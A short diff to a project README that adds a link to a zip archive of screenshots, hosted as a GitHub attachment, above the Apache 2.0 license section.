@@ -125,6 +125,9 @@ Download the file and open with Jupyter Notebook.
 
 Add links to all screenshot file names
 
+[Screenshots for TwentyOnePllots.zip](https://github.com/user-attachments/files/29098490/Screenshots.for.TwentyOnePllots.zip)
+
+
 ## License
 
 This project is licensed under the Apache License 2.0 – see the [LICENSE](LICENSE) file for details.
